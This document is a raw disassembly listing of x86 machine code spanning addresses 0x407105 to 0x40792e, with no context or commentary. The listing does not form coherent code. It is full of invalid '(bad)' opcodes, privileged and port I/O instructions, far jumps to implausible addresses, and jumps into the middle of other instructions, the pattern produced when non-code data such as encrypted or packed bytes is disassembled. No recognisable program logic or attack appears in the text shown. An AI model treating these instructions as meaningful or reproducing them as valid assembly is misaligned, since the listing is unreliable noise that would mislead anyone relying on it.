  407105:	pop    ebx
  407106:	adc    eax,0x6489891
  40710b:	dec    esp
  40710c:	add    al,0xdb
  40710e:	out    dx,al
  40710f:	imul   eax,DWORD PTR [esi-0x6d],0x6791562d
  407116:	sub    edi,edi
  407118:	xchg   edi,eax
  407119:	loope  0x407167
  40711b:	add    al,BYTE PTR [edx]
  40711d:	xchg   edx,eax
  40711e:	addr16 cli 
  407120:	jne    0x407143
  407122:	dec    ebx
  407123:	popf   
  407124:	push   ecx
  407125:	retf   0xfafd
  407128:	or     DWORD PTR [ecx-0x45],ebp
  40712b:	sar    DWORD PTR [ebp-0x7cfa19c],cl
  407131:	lods   eax,DWORD PTR ds:[esi]
  407132:	mov    al,ds:0xb0d8f458
  407137:	lea    edx,[esi]
  407139:	shl    bl,cl
  40713b:	gs cld 
  40713d:	fist   WORD PTR [ebx-0xa]
  407140:	xor    BYTE PTR [edx-0x5d],al
  407143:	fnstsw WORD PTR [ebx-0xd]
  407146:	dec    ebx
  407147:	aaa    
  407148:	sar    DWORD PTR [ebp-0x53109e2f],cl
  40714e:	or     esi,ebp
  407150:	and    ebx,DWORD PTR [eax-0x3d]
  407153:	dec    edx
  407154:	rol    esi,0xbf
  407157:	xor    al,0xa1
  407159:	inc    eax
  40715a:	cwde   
  40715b:	fnstenv [ebx-0x1c0ac716]
  407161:	cld    
  407162:	fst    QWORD PTR ds:0x9a1e4cad
  407168:	hlt    
  407169:	adc    al,0xd6
  40716b:	ja     0x4071db
  40716d:	js     0x407105
  40716f:	and    eax,0x35c9ef8e
  407174:	je     0x4071a3
  407176:	mov    ch,0xb7
  407178:	imul   edi,DWORD PTR [edx+0x6a],0xfa913f7e
  40717f:	add    al,0x14
  407181:	sub    BYTE PTR [ebp-0x4ebb8d57],dl
  407187:	or     ebx,edi
  407189:	push   ecx
  40718a:	jg     0x407140
  40718c:	rol    DWORD PTR [eax],0x6b
  40718f:	mov    bl,0xcf
  407191:	pop    ecx
  407192:	push   edx
  407193:	(bad)  
  407194:	iret   
  407195:	xchg   ebp,eax
  407196:	(bad)  
  407198:	or     DWORD PTR [ecx],ebp
  40719a:	rcr    DWORD PTR [ecx-0x442fde35],0x31
  4071a1:	aaa    
  4071a2:	ja     0x407178
  4071a4:	pop    ebx
  4071a5:	hlt    
  4071a6:	ins    BYTE PTR es:[edi],dx
  4071a7:	sbb    eax,DWORD PTR [edi+0x217d8a6d]
  4071ad:	out    0x7e,al
  4071af:	jge    0x4071ed
  4071b1:	mov    ds:0x770e6fee,eax
  4071b6:	daa    
  4071b7:	je     0x4071fe
  4071b9:	ja     0x407221
  4071bb:	(bad)  
  4071bc:	or     DWORD PTR [ecx-0x5c],ebx
  4071bf:	mov    cl,0xcb
  4071c1:	div    BYTE PTR [eax]
  4071c3:	jb     0x407204
  4071c5:	fwait
  4071c6:	and    al,0x9
  4071c8:	icebp  
  4071c9:	sub    eax,0xecf15e15
  4071ce:	mov    ebp,0xb7e757bb
  4071d3:	call   0x797f:0xc35fd7f2
  4071da:	loope  0x40720d
  4071dc:	test   eax,0x29983ef5
  4071e1:	out    0x51,eax
  4071e3:	push   0x62abb888
  4071e8:	out    dx,al
  4071e9:	mov    DWORD PTR [edx],esp
  4071eb:	add    ebp,ebx
  4071ed:	sub    eax,0x9d0a1926
  4071f2:	adc    di,WORD PTR [esi-0x27f02a01]
  4071f9:	mov    eax,0xffd0ae9f
  4071fe:	das    
  4071ff:	sbb    edx,DWORD PTR [ebx]
  407201:	addr16 aaa 
  407203:	lock cwde 
  407205:	mov    ch,0x9e
  407207:	arpl   dx,dx
  407209:	or     edx,DWORD PTR [edx+0x51]
  40720c:	add    edi,edx
  40720e:	repnz sbb WORD PTR [eax],di
  407212:	mov    ebx,0x9e9ab5e9
  407217:	retf   
  407218:	fdivr  QWORD PTR [ebx-0x72a2967]
  40721e:	cmp    cl,BYTE PTR [ebx-0x10dabee0]
  407224:	mov    ds:0x1a8fd6fe,eax
  407229:	push   ds
  40722a:	retf   
  40722b:	imul   ebx,DWORD PTR [ecx+0x76e2ade9],0x3b
  407232:	repnz sbb edi,DWORD PTR ds:0xd0c0a4b0
  407239:	addr16 inc edi
  40723b:	or     ah,BYTE PTR cs:0x284c1993
  407242:	sub    BYTE PTR [ecx],0x62
  407245:	int3   
  407246:	mov    eax,ds:0x571ff288
  40724b:	pop    ebx
  40724c:	push   ss
  40724d:	test   al,0x5d
  40724f:	test   eax,0xb15f70b9
  407254:	xlat   BYTE PTR ds:[ebx]
  407255:	mov    dl,0xf0
  407257:	scas   eax,DWORD PTR es:[edi]
  407258:	add    al,0xee
  40725a:	push   esp
  40725b:	ret    0x7eb1
  40725e:	and    dl,BYTE PTR [eax-0x7577312b]
  407264:	cmp    BYTE PTR [ebx-0x81b1c7a],al
  40726a:	sub    al,0x54
  40726c:	mov    esi,esi
  40726e:	push   ss
  40726f:	js     0x4072f0
  407271:	leave  
  407272:	test   eax,0x75cfaa42
  407277:	sub    eax,0xccbd389c
  40727c:	inc    esp
  40727d:	bnd jb 0x407207
  407280:	sbb    bl,0xa2
  407283:	cmp    ebp,ebp
  407285:	lahf   
  407286:	in     al,0x58
  407288:	cwde   
  407289:	loop   0x40727f
  40728b:	cmp    esi,DWORD PTR [edi*1+0x12af0395]
  407292:	out    dx,al
  407293:	push   ecx
  407294:	sub    BYTE PTR [edx+0x5d],bh
  407297:	adc    BYTE PTR [eax+0x63],ah
  40729a:	cs xchg esi,eax
  40729c:	cmp    edx,DWORD PTR [eax]
  40729e:	dec    edi
  40729f:	loope  0x407267
  4072a1:	mov    al,ds:0x4c7192aa
  4072a6:	jns    0x4072ab
  4072a8:	es cmp ebx,edx
  4072ab:	sahf   
  4072ac:	and    BYTE PTR [esi-0x9],al
  4072af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072b0:	sbb    dh,ah
  4072b2:	push   cs
  4072b3:	adc    ebx,DWORD PTR [edi+0x37]
  4072b6:	lods   eax,DWORD PTR ds:[esi]
  4072b7:	xor    bl,dh
  4072b9:	pop    es
  4072ba:	sbb    BYTE PTR [ebp+ebx*1+0x7e],dh
  4072be:	mov    WORD PTR [esp+esi*4],?
  4072c1:	or     eax,0xe0ae04a0
  4072c6:	mov    ah,0x6c
  4072c8:	out    dx,eax
  4072c9:	lock (bad) 
  4072cb:	call   0xe748:0x415d474
  4072d2:	mov    al,0xc7
  4072d4:	addr16 enterw 0x91e1,0xe7
  4072da:	sub    DWORD PTR [ecx-0x75],edx
  4072dd:	dec    ebp
  4072de:	dec    esi
  4072df:	sbb    DWORD PTR [esi],0xffffffb3
  4072e2:	cmp    al,0xfa
  4072e4:	adc    al,0xed
  4072e6:	inc    esp
  4072e7:	imul   ecx,DWORD PTR [eax-0x3498f401],0x52
  4072ee:	mov    edi,0xc300b83a
  4072f3:	pop    ebx
  4072f4:	add    al,0xfe
  4072f6:	repnz mov esp,0xd406afc0
  4072fc:	mov    edx,0xbe21445f
  407301:	aam    0xb4
  407303:	xchg   DWORD PTR [esi+0x5a],ebp
  407306:	mov    esi,0xe6941a34
  40730b:	xor    cl,dh
  40730d:	cmp    ebp,eax
  40730f:	loope  0x40736c
  407311:	adc    eax,DWORD PTR [edx]
  407313:	aas    
  407314:	test   al,0x21
  407316:	(bad)  
  407317:	mov    cl,0x47
  407319:	pop    esi
  40731a:	add    DWORD PTR [eax],esp
  40731c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40731d:	or     al,0x40
  40731f:	mov    ecx,0x713cb3d0
  407324:	lock and ecx,DWORD PTR [ebx-0x6]
  407328:	sub    al,0x1e
  40732a:	enter  0x719a,0xfc
  40732e:	sti    
  40732f:	mov    ds:0xd5d407fd,al
  407334:	jp     0x4072f5
  407336:	mov    al,0x85
  407338:	add    bh,BYTE PTR [ebx]
  40733a:	leave  
  40733b:	mov    ecx,0xd41bd00b
  407340:	add    eax,0xa701a9af
  407345:	fiadd  WORD PTR [edx+0x5a]
  407348:	outs   dx,BYTE PTR ds:[esi]
  407349:	outs   dx,BYTE PTR ds:[esi]
  40734a:	in     al,0x29
  40734c:	mov    edi,0xcbe5dc25
  407351:	cmp    ah,BYTE PTR [edx+0x24]
  407354:	test   al,0xc8
  407356:	adc    DWORD PTR ds:0x207b7903,ebx
  40735c:	rcl    edi,cl
  40735e:	xor    eax,0x22df82a1
  407363:	and    BYTE PTR [ebp+0x5e],cl
  407366:	sub    BYTE PTR [ebp+0x274d132b],0x97
  40736d:	xlat   BYTE PTR ds:[ebx]
  40736e:	sbb    DWORD PTR [esi+0x15],0xfffffffe
  407372:	add    eax,DWORD PTR [ebx]
  407374:	mov    WORD PTR [ecx],gs
  407376:	(bad)
  407379:	pop    ss
  40737a:	cmp    ebp,DWORD PTR cs:[esi+ebx*4-0x5e666d77]
  407382:	xchg   ebx,eax
  407383:	mov    esp,0xa690272f
  407388:	(bad)  
  407389:	cmc    
  40738a:	in     eax,dx
  40738b:	sbb    eax,0x4a348cec
  407390:	aam    0x3f
  407392:	pop    esp
  407393:	jmp    0xfc863dcb
  407398:	repz ror DWORD PTR [esi],0x7e
  40739c:	xor    ah,BYTE PTR [ebp-0x4f]
  40739f:	and    al,0xbf
  4073a1:	in     al,dx
  4073a2:	pop    ds
  4073a3:	adc    BYTE PTR [edx-0x4498ba21],al
  4073a9:	mov    al,ds:0xe9a5293a
  4073ae:	xchg   edx,eax
  4073af:	je     0x407335
  4073b1:	mov    ebp,0xbd4ff42
  4073b6:	icebp  
  4073b7:	neg    ch
  4073b9:	ror    BYTE PTR [ecx*2-0x3034e9d7],1
  4073c0:	pop    esp
  4073c1:	push   eax
  4073c2:	mov    al,0xa4
  4073c4:	and    al,0x26
  4073c6:	(bad)  
  4073c8:	into   
  4073c9:	adc    DWORD PTR [edi+0x41],0xffffffa3
  4073cd:	aaa    
  4073ce:	inc    ebp
  4073cf:	xchg   ebp,eax
  4073d0:	push   edi
  4073d1:	cmp    eax,0xda094294
  4073d6:	mov    DWORD PTR [ecx+ebx*4+0x75],0x31e39500
  4073de:	pop    ds
  4073df:	sti    
  4073e0:	sbb    BYTE PTR [esp+esi*4+0x2],ch
  4073e4:	push   ebp
  4073e5:	push   ebp
  4073e6:	dec    ebp
  4073e7:	mov    bl,0x3b
  4073e9:	sbb    DWORD PTR [ebx-0xd],ecx
  4073ec:	(bad)  
  4073ed:	sti    
  4073ee:	fst    QWORD PTR ds:0x151c02d9
  4073f4:	call   0xeaf839b1
  4073f9:	dec    esi
  4073fa:	mov    bh,0xc8
  4073fc:	icebp  
  4073fd:	les    esp,FWORD PTR [ebp-0x4ff20492]
  407403:	stos   BYTE PTR es:[edi],al
  407404:	sbb    al,0x32
  407406:	pop    ss
  407407:	or     al,0x2f
  407409:	mov    ds:0x8c1325f4,al
  40740e:	xchg   WORD PTR [edi],si
  407411:	rcl    DWORD PTR ds:0x4f3791ce,cl
  407417:	out    0x25,eax
  407419:	outs   dx,BYTE PTR ds:[esi]
  40741a:	add    DWORD PTR [eax+0x6391d153],0xbc2986ff
  407424:	cmp    DWORD PTR [edi-0x40918ee4],edi
  40742a:	xor    bh,cl
  40742c:	mov    ecx,0xdd7dbd5d
  407431:	mov    dl,0xcf
  407433:	pop    eax
  407434:	xchg   BYTE PTR [ebx],ch
  407436:	mov    esp,0xbe6ef665
  40743b:	mov    edi,0xe30c9594
  407440:	out    dx,eax
  407441:	jo     0x4073cd
  407443:	pop    esi
  407444:	out    dx,eax
  407445:	push   cs
  407446:	xor    BYTE PTR [ebx+0x203c6b13],0x29
  40744d:	cli    
  40744e:	mov    al,0xbe
  407450:	push   esp
  407451:	call   DWORD PTR [esi-0x7d230f02]
  407457:	cmp    esi,esi
  407459:	sti    
  40745a:	ss jl  0x4073ea
  40745d:	mov    ah,0x1e
  40745f:	or     cl,BYTE PTR [edi]
  407461:	retf   
  407462:	cwde   
  407463:	dec    esp
  407464:	add    bh,BYTE PTR [ebx]
  407466:	fwait
  407467:	push   cs
  407468:	(bad)  
  407469:	sub    BYTE PTR [edi],al
  40746b:	xchg   edi,eax
  40746c:	inc    eax
  40746d:	imul   eax,DWORD PTR [ebp+0x6f1a8880],0xfffffff4
  407474:	retf   0xd2a7
  407477:	lock aaa 
  407479:	sub    al,0xd5
  40747b:	mov    bl,0x33
  40747d:	jmp    0x4074b5
  40747f:	data16 test al,0xb9
  407482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407483:	cli    
  407484:	mov    eax,ds:0x3e5be085
  407489:	into   
  40748a:	pop    ss
  40748b:	mov    ds:0x7c5d546b,al
  407490:	and    esp,ebp
  407492:	mov    cl,0xd4
  407494:	loopne 0x40743a
  407496:	jge    0x40744c
  407498:	data16 and BYTE PTR [ecx-0x7b],bh
  40749c:	cmp    DWORD PTR [edx+0x6],ebx
  40749f:	push   ebx
  4074a0:	add    ebp,DWORD PTR [ecx-0x6777400c]
  4074a6:	aam    0xb1
  4074a8:	inc    esi
  4074a9:	fcom   QWORD PTR [eax]
  4074ab:	int3   
  4074ac:	leave  
  4074ad:	ret    0x6f19
  4074b0:	push   esi
  4074b1:	push   ss
  4074b2:	adc    ebp,edx
  4074b4:	pop    edi
  4074b5:	ficomp DWORD PTR [ebp+ebx*1-0x39]
  4074b9:	xchg   BYTE PTR [ebp+0x6e10ab41],cl
  4074bf:	jns    0x407461
  4074c1:	scas   al,BYTE PTR es:[edi]
  4074c2:	mov    ch,ch
  4074c4:	das    
  4074c5:	and    eax,0xb3f1c4c3
  4074ca:	xor    eax,0xe78589d2
  4074cf:	cmp    eax,0xa40e4acd
  4074d4:	iret   
  4074d5:	mov    edi,0x973bae5f
  4074da:	lea    esp,[ebx-0x36d578bf]
  4074e0:	xor    BYTE PTR [edx+0x20],ah
  4074e3:	mov    ebp,0xa492f5e9
  4074e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074ea:	add    ebp,ecx
  4074ec:	loopne 0x40756a
  4074ee:	dec    esp
  4074ef:	(bad)
  4074f3:	call   0x233a6332
  4074f8:	pop    ebp
  4074f9:	mov    al,ds:0xb1ddb173
  4074fe:	jmp    0x40752f
  407500:	(bad)  
  407501:	xor    BYTE PTR [ebx+0x25],cl
  407504:	ja     0x407580
  407506:	dec    ebx
  407507:	add    al,bl
  407509:	(bad)  
  40750a:	pop    ecx
  40750b:	push   es
  40750c:	pusha  
  40750d:	out    dx,al
  40750e:	xor    DWORD PTR [ebx+0x5f81d9e1],esi
  407514:	and    DWORD PTR [di],edx
  407517:	out    0xc3,eax
  407519:	neg    BYTE PTR [eax-0x47]
  40751c:	push   0xafb1883e
  407521:	cli    
  407522:	add    ecx,DWORD PTR [ebx-0x5c865806]
  407528:	cld    
  407529:	sub    ebx,esi
  40752b:	jo     0x407594
  40752d:	(bad)  
  40752e:	jg     0x4074f0
  407530:	lock mov cl,0x1a
  407533:	jg     0x4074fa
  407535:	sbb    DWORD PTR [edi],ebx
  407537:	fadd   QWORD PTR [edx-0x4d68972d]
  40753d:	in     al,dx
  40753e:	jle    0x407566
  407540:	mov    dh,0xcf
  407542:	and    edi,eax
  407544:	and    al,0xe3
  407546:	lea    ebx,[ebx+ecx*1-0x5adce05b]
  40754d:	xchg   edi,eax
  40754e:	mov    dl,0x5c
  407550:	popa   
  407551:	sub    eax,DWORD PTR [edx+eax*2+0x88df2ae]
  407558:	sbb    al,0x5d
  40755a:	xlat   BYTE PTR ds:[ebx]
  40755b:	jg     0x40751a
  40755d:	jge    0x407591
  40755f:	icebp  
  407560:	inc    eax
  407562:	sti    
  407563:	adc    DWORD PTR [edx+0x1b62d847],0xd2028788
  40756d:	arpl   bx,sp
  40756f:	sub    al,BYTE PTR [esi+0x3f]
  407572:	add    BYTE PTR [ebx+ecx*4],ah
  407575:	stc    
  407576:	jge    0x407574
  407578:	pop    ds
  407579:	or     BYTE PTR [edx-0x50],ah
  40757c:	pop    esi
  40757d:	sub    al,0xf5
  40757f:	cdq    
  407580:	repnz or al,BYTE PTR [esi+0x726cd17]
  407587:	mov    eax,0x2fa13de7
  40758c:	shl    DWORD PTR [edi],cl
  40758e:	sub    DWORD PTR [esi],0x4ace3769
  407594:	xchg   edx,eax
  407595:	sysexit 
  407597:	inc    esp
  407598:	cli    
  407599:	sahf   
  40759a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40759b:	ret    0x45ed
  40759e:	inc    eax
  40759f:	mov    esp,0x795e0102
  4075a4:	stos   DWORD PTR es:[edi],eax
  4075a5:	in     al,0xb2
  4075a7:	xor    cl,BYTE PTR [edi-0x27]
  4075aa:	rol    DWORD PTR [edi+0x46],1
  4075ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075ae:	xchg   esi,eax
  4075af:	add    eax,0xca756c83
  4075b4:	daa    
  4075b5:	pop    edi
  4075b6:	pushf  
  4075b7:	mov    esp,0xf27dbf14
  4075bc:	xor    bl,cl
  4075be:	mov    ds:0x3ea1f4e0,eax
  4075c3:	int3   
  4075c4:	cmc    
  4075c5:	and    esi,DWORD PTR [edx-0x27eb4da9]
  4075cb:	fs cmp al,dl
  4075ce:	jmp    0x786df2f
  4075d3:	push   edi
  4075d4:	xchg   edx,eax
  4075d5:	stos   BYTE PTR es:[edi],al
  4075d6:	inc    esp
  4075d7:	pop    esi
  4075d8:	jmp    0xe23a:0x31ada929
  4075df:	jmp    0x90c05f93
  4075e4:	inc    edi
  4075e5:	jl     0x40762d
  4075e7:	mov    ah,0x95
  4075e9:	outs   dx,BYTE PTR ds:[esi]
  4075ea:	push   0x72
  4075ec:	sar    BYTE PTR [edi-0x3eaa7563],cl
  4075f2:	add    eax,0x1a708162
  4075f7:	aaa    
  4075f8:	imul   ecx,DWORD PTR [edx+0x73e39a3f],0xffffff81
  4075ff:	out    0xf6,eax
  407601:	or     eax,0xfd87684e
  407606:	ret    
  407607:	fisubr DWORD PTR [edx+0x1882cf1d]
  40760d:	test   DWORD PTR [ecx+0x68796a71],esp
  407613:	xchg   DWORD PTR [edx+0x44e793d3],ebp
  407619:	out    0xf7,al
  40761b:	and    ah,BYTE PTR [eax]
  40761d:	(bad)  
  40761e:	sbb    dh,BYTE PTR [ebp+0x53ad646c]
  407624:	pop    esi
  407625:	mov    al,0x21
  407627:	xchg   bl,cl
  407629:	jecxz  0x407635
  40762b:	dec    ebp
  40762c:	adc    al,0x37
  40762e:	jmp    0xf694:0xf8410070
  407635:	shl    bh,0x8b
  407638:	add    dh,BYTE PTR [ecx-0x15]
  40763b:	(bad)  
  40763c:	mov    ah,0x32
  40763e:	iret   
  40763f:	loop   0x407658
  407641:	arpl   WORD PTR [ecx],sp
  407643:	push   ss
  407644:	bound  esp,QWORD PTR ds:0x276bdb8c
  40764a:	mov    ecx,0x5ee69aef
  40764f:	imul   ebx,DWORD PTR [esi+0x29ca65da],0x16
  407656:	jo     0x407693
  407658:	js     0x40764f
  40765a:	int3   
  40765b:	jns    0x40765d
  40765d:	int    0x51
  40765f:	cli    
  407660:	pop    ss
  407661:	call   0x410c2bb2
  407666:	lahf   
  407667:	inc    ebx
  407668:	sahf   
  407669:	inc    ebx
  40766a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40766b:	pop    edi
  40766c:	jmp    0x40763f
  40766e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40766f:	mov    bl,0x0
  407671:	mov    cl,0x73
  407673:	mov    al,0x4f
  407675:	jne    0x40761c
  407677:	pop    ecx
  407678:	(bad)  
  407679:	cmp    eax,0xc3858952
  40767e:	(bad)
  407681:	dec    ebx
  407682:	mov    DWORD PTR [ecx-0x3d],ebx
  407685:	xor    ebx,DWORD PTR [edx-0x56b29d96]
  40768b:	dec    eax
  40768c:	push   ecx
  40768d:	jnp    0x40764a
  40768f:	add    DWORD PTR ss:[edi],ebx
  407692:	sbb    eax,0x63c23bd5
  407697:	loop   0x407624
  407699:	jbe    0x407621
  40769b:	inc    edi
  40769c:	push   0x2d0647d7
  4076a1:	push   ecx
  4076a2:	les    esp,FWORD PTR [eax-0x34]
  4076a5:	call   0xb9c44128
  4076aa:	into   
  4076ab:	jmp    0x4076f5
  4076ad:	fnstenv [eax]
  4076af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076b0:	fisubr WORD PTR [edx+0x6658cf2d]
  4076b6:	ss xchg ecx,eax
  4076b8:	mov    bl,0x76
  4076ba:	hlt    
  4076bb:	cmp    al,0xb8
  4076be:	ret    0xeb4f
  4076c1:	pop    ebp
  4076c2:	in     al,0x42
  4076c4:	adc    al,0x1b
  4076c6:	stos   DWORD PTR es:[edi],eax
  4076c7:	pop    ebx
  4076c8:	loope  0x407678
  4076ca:	dec    edi
  4076cb:	and    eax,eax
  4076cd:	in     al,0xf6
  4076cf:	out    dx,eax
  4076d0:	pusha  
  4076d1:	push   ecx
  4076d2:	(bad)  
  4076d3:	or     ebp,DWORD PTR [edi]
  4076d5:	fiadd  DWORD PTR [eax-0x50]
  4076d8:	mov    ds:0xf9b90750,eax
  4076dd:	mov    ebp,0x5752a81e
  4076e2:	inc    ebx
  4076e3:	jecxz  0x4076d6
  4076e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076e6:	pop    ebp
  4076e7:	mov    eax,0x78032081
  4076ec:	mov    ch,0xed
  4076ee:	ficom  WORD PTR [esi+0x6a]
  4076f1:	scas   al,BYTE PTR es:[edi]
  4076f2:	jle    0x4076e3
  4076f4:	push   esi
  4076f5:	jb     0x407684
  4076f7:	adc    dh,BYTE PTR [edx-0xe0ffd1c]
  4076fd:	ficomp WORD PTR [eax+0x59f8a2a2]
  407703:	jbe    0x407725
  407705:	sbb    eax,0x6bb76f48
  40770a:	ret    
  40770b:	or     eax,0x1291d852
  407710:	sub    al,0x92
  407712:	push   ebp
  407713:	(bad)  
  407714:	mov    al,ds:0xdf0d2c4f
  407719:	xor    eax,0xbf4dfee9
  40771e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40771f:	lahf   
  407720:	jno    0x4076ed
  407722:	sub    bh,BYTE PTR [ebx+0x67700c9]
  407728:	cmp    edi,edi
  40772a:	les    ecx,FWORD PTR [eax]
  40772c:	jg     0x40778b
  40772e:	lahf   
  40772f:	out    0xf8,al
  407731:	in     eax,0xf6
  407733:	rol    DWORD PTR [edi-0x5767f2f1],cl
  407739:	cdq    
  40773a:	cmc    
  40773b:	inc    ebp
  40773c:	stos   BYTE PTR es:[edi],al
  40773d:	shr    BYTE PTR [ecx-0x59],1
  407740:	test   DWORD PTR [eax-0xf],ebp
  407743:	mov    edi,0xf10fbed0
  407748:	xor    eax,0x3313bc4
  40774d:	gs and edx,ebx
  407750:	popf   
  407751:	jae    0x4076d3
  407753:	push   ebx
  407754:	sti    
  407755:	pop    ebp
  407756:	dec    ecx
  407757:	enter  0x1df1,0xa6
  40775b:	ret    0xd44d
  40775e:	pop    es
  40775f:	cld    
  407760:	outs   dx,DWORD PTR ds:[esi]
  407761:	test   eax,0xac08111b
  407766:	jo     0x4077b5
  407768:	jbe    0x40777b
  40776a:	nop
  40776b:	or     dl,cl
  40776d:	xor    DWORD PTR [ebx-0x6045a52],esp
  407773:	xchg   edx,eax
  407774:	cmc    
  407775:	out    0x5c,al
  407777:	ret    
  407778:	add    BYTE PTR [eax],dl
  40777a:	dec    edi
  40777b:	hlt    
  40777c:	push   esp
  40777d:	add    dh,bl
  40777f:	xor    ebp,esp
  407781:	sub    DWORD PTR [ebx+eiz*2+0x2c],edi
  407785:	sub    ah,al
  407787:	inc    ebx
  407788:	les    ebx,FWORD PTR [ebx+0x45]
  40778b:	adc    al,0x96
  40778d:	(bad)  
  40778f:	or     eax,0xe0f8cac5
  407794:	mov    BYTE PTR [esi-0x4efb8f98],al
  40779a:	outs   dx,DWORD PTR ds:[esi]
  40779b:	rol    edx,cl
  40779d:	push   es
  40779e:	hlt    
  40779f:	sti    
  4077a0:	pushf  
  4077a1:	xchg   edi,eax
  4077a2:	nop
  4077a3:	rol    DWORD PTR [ebp-0x1a],1
  4077a6:	lahf   
  4077a7:	pop    ecx
  4077a8:	shr    DWORD PTR [esi-0x190ab38f],cl
  4077ae:	enter  0x994b,0x59
  4077b2:	stmxcsr DWORD PTR [ecx-0xb]
  4077b6:	ret    
  4077b7:	push   edx
  4077b8:	mov    DWORD PTR [edi-0xd102a64],ecx
  4077be:	jecxz  0x407824
  4077c0:	pop    edi
  4077c1:	(bad)  
  4077c2:	aam    0xd7
  4077c4:	mov    eax,0xf9cf055d
  4077c9:	pop    esi
  4077ca:	fucomp st(4)
  4077cc:	push   edi
  4077cd:	mov    ebp,0x45f44dff
  4077d2:	jmp    0xddda2bfb
  4077d7:	shl    ebx,cl
  4077d9:	mov    eax,0x2e194a76
  4077de:	xchg   edi,eax
  4077df:	in     al,dx
  4077e0:	jp     0x407774
  4077e2:	xchg   DWORD PTR [ebp-0x6],eax
  4077e5:	pop    ss
  4077e6:	repz and DWORD PTR [eax],esp
  4077e9:	pop    esp
  4077ea:	jne    0x4077ea
  4077ec:	lods   al,BYTE PTR ds:[esi]
  4077ed:	dec    edi
  4077ee:	add    DWORD PTR [eax],0xfffffff4
  4077f1:	daa    
  4077f2:	in     al,dx
  4077f3:	js     0x4077ed
  4077f5:	lods   al,BYTE PTR ds:[esi]
  4077f6:	sbb    BYTE PTR [esp+ebx*4+0x4d],bh
  4077fa:	gs sub ah,bl
  4077fd:	and    al,0x3b
  4077ff:	call   0x6662edb7
  407804:	sbb    DWORD PTR [edx],esi
  407806:	shl    DWORD PTR [ebp-0x63],cl
  407809:	(bad)  [eax]
  40780b:	push   edx
  40780c:	fld    DWORD PTR ds:0x1b9fd719
  407812:	xor    DWORD PTR [edx+0x68b6a049],ebp
  407818:	fwait
  407819:	jmp    0x4077ee
  40781b:	push   edx
  40781c:	pop    ss
  40781d:	and    BYTE PTR [ebp+0x7d79780],0x10
  407824:	mov    esi,0x1bfa3541
  407829:	mov    ecx,0x55aa1eeb
  40782e:	or     bh,BYTE PTR [ecx+0xf]
  407831:	or     edi,DWORD PTR [ecx-0x452822f8]
  407837:	pop    ds
  407838:	ficomp DWORD PTR [edi+0x2a08276b]
  40783e:	(bad)  
  40783f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407840:	push   ebp
  407841:	(bad)  
  407842:	xor    al,0xed
  407844:	mov    DWORD PTR ds:0x4d4dbc5f,0x7f88d48b
  40784e:	int    0xfa
  407850:	and    edx,DWORD PTR [ebx+0x4fc299e9]
  407856:	(bad)  
  407857:	out    0x77,al
  407859:	inc    esi
  40785a:	sub    BYTE PTR [ebx],0x14
  40785d:	cwde   
  40785e:	push   es
  40785f:	mov    esi,0xaf11015a
  407864:	test   DWORD PTR [eax+0x26],ebp
  407867:	fsubr  QWORD PTR [esi-0x2d3ecc93]
  40786d:	xor    al,BYTE PTR [edx+0x6b9dd4db]
  407873:	jae    0x4078da
  407875:	mov    al,0x3f
  407877:	daa    
  407878:	or     eax,0x5c83cd6e
  40787d:	scas   eax,DWORD PTR es:[edi]
  40787e:	and    eax,0x7b5fc910
  407883:	repz shl BYTE PTR [esi],1
  407886:	xchg   edi,eax
  407887:	mov    bh,0x3a
  407889:	test   ax,0xc388
  40788d:	ins    DWORD PTR es:[edi],dx
  40788e:	adc    al,0x56
  407890:	add    ch,0xc8
  407893:	loope  0x40790a
  407895:	or     eax,0xd244589f
  40789a:	pop    ds
  40789b:	(bad)  
  40789c:	pop    esi
  40789d:	mov    dl,0x4a
  40789f:	test   BYTE PTR ds:0x7a1869f0,0x2d
  4078a6:	in     eax,0xc
  4078a8:	inc    ecx
  4078a9:	cmp    eax,0x11bd564a
  4078ae:	popf   
  4078af:	jecxz  0x407929
  4078b1:	not    bl
  4078b3:	mov    esi,0x1181b4bb
  4078b8:	leave  
  4078b9:	adc    eax,0xf2374064
  4078be:	mov    ebx,gs
  4078c0:	repz xor DWORD PTR [edi],ecx
  4078c3:	mov    ecx,0x623ce979
  4078c8:	sub    ebx,esi
  4078ca:	cmp    ebp,DWORD PTR [ebx]
  4078cc:	stc    
  4078cd:	or     eax,0xe0823c2e
  4078d2:	inc    ecx
  4078d3:	movnti DWORD PTR [ebx-0x27],edx
  4078d7:	xor    eax,ecx
  4078d9:	inc    edx
  4078da:	adc    BYTE PTR [edi+0x79],bl
  4078dd:	sahf   
  4078de:	adc    DWORD PTR [eax],0xffffffb2
  4078e1:	mov    gs,WORD PTR [ebp+0x55]
  4078e4:	sub    esp,ecx
  4078e6:	pop    edi
  4078e7:	mov    BYTE PTR [ebx],cl
  4078e9:	mov    bh,ch
  4078eb:	jge    0x407962
  4078ed:	pop    esi
  4078ee:	and    dl,BYTE PTR [ecx+0x3a]
  4078f1:	icebp  
  4078f2:	and    al,0x10
  4078f4:	sub    al,0x5c
  4078f6:	out    0xaf,ax
  4078f9:	rol    DWORD PTR [ebp+0x5b7ad7a],1
  4078ff:	mov    DWORD PTR [edx+0x24],ebp
  407902:	fild   DWORD PTR [edi]
  407904:	push   ecx
  407905:	xchg   ebx,eax
  407906:	mov    WORD PTR ds:0x3b2d1f95,es
  40790c:	in     eax,dx
  40790d:	inc    ecx
  40790e:	repz cmp dh,BYTE PTR [ebx]
  407911:	in     al,0x93
  407913:	clc    
  407914:	test   eax,0x732642d9
  407919:	out    0xe4,al
  40791b:	jo     0x4078dc
  40791d:	pop    ebp
  40791e:	adc    BYTE PTR [edx-0x7e6210ee],al
  407924:	sbb    BYTE PTR [ebx+0x7a],ah
  407927:	mov    ebx,0x50d438fb
  40792c:	mov    dl,0x78
  40792e:	lds    ecx,FWORD PTR [edi]
